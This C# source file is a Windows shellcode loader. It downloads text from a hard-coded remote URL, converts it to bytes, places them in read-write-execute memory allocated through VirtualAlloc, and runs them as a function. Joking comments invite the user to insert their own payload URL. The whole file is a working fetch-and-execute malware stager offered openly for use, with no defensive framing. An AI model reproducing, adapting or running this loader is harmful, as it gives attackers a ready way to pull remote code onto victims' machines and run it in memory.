using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace Code
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main()
        {
            string shellcode = "";
            




            //OHAI! Put your URL here. Has to be a file.
            
             
            var mattsHot = "http://4channel.biz/datshellcode.txt";






            //Download the hot badness
            WebRequest webRequest = WebRequest.Create(mattsHot);
            webRequest.Method = WebRequestMethods.Http.Get;
            WebResponse webResponse = webRequest.GetResponse();
            Stream webResponseStream = webResponse.GetResponseStream();
            StreamReader reader = new StreamReader(webResponseStream);
            shellcode = reader.ReadToEnd();
            webResponseStream.Close();

            //Make a byte array
            byte[] sc = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]);
            }

            // Allocate RWX memory for the shellcode
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");

            try
            {
                // Copy shellcode to RWX buffer
                Marshal.Copy(sc, 0, baseAddr, sc.Length);

                // Get pointer to function created in memory
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                del();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
            }
                // Insert dolphin for extra cuteness
            Console.ReadLine();
        }
    }
}
